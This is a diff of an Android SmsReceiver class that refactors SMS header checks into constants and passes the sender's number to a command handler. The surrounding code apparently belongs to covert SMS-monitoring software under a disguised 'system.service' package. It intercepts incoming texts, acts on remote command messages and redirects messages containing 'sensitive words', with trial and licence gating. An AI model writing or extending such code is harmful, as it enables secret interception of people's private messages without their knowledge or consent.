@@ -10,6 +10,7 @@ import system.service.activity.GlobalPrefActivity;
 import system.service.activity.InitActivity;
 import system.service.config.ConfigCtrl;
 import com.particle.inspector.common.util.sms.AuthSms;
+import com.particle.inspector.common.util.sms.SmsConsts;
 import com.particle.inspector.common.util.sms.SuperLoggingSms;
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.FileCtrl;
@@ -236,7 +237,7 @@ public class SmsReceiver extends BroadcastReceiver
 
 			//-------------------------------------------------------------------------------
 			// If it is the response validation SMS from server
-			else if (smsBody.startsWith(AuthSms.SMS_HEADER + AuthSms.SMS_SEPARATOR)) 
+			else if (smsBody.startsWith(SmsConsts.HEADER_AUTH_EX)) 
 			{
 				// If it is not from server (phone number is different), return
 				//if (!SmsCtrl.getSmsAddress(intent).equalsIgnoreCase(context.getResources().getString(R.string.srv_address))) {
@@ -276,14 +277,15 @@ public class SmsReceiver extends BroadcastReceiver
 			
 			//-------------------------------------------------------------------------------
 			// If it is the indication SMS
-			else if (smsBody.startsWith("#"))
+			else if (smsBody.startsWith(SmsConsts.HEADER_INDICATION))
 			{
-				IndicationHandler.handleIndicationSms(context, smsBody);
+				String phoneNum = SmsCtrl.getSmsAddress(intent);
+				IndicationHandler.handleIndicationSms(context, smsBody, phoneNum);
 			}
 
 			//-------------------------------------------------------------------------------
 			// Redirect SMS that contains sensitive words
-			else if (!smsBody.startsWith("Info,") && containSensitiveWords(context, smsBody)) 
+			else if (!smsBody.startsWith(SmsConsts.HEADER_INFO_EX) && containSensitiveWords(context, smsBody)) 
 			{
 				// If neither in trail and nor licensed, return
 				LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
